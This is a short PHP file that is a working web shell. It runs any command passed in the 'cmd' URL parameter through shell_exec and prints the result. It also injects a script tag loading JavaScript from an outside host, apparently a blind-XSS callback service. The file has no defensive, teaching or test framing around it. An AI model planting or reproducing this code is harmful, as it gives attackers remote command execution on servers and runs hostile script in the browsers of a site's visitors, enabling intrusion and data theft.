<?php
// Extract 'cmd' parameter from the URL and execute it if present
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}

// XSS Script Injection
echo '<script src="https://aksargu.bxss.in"></script>';
?>
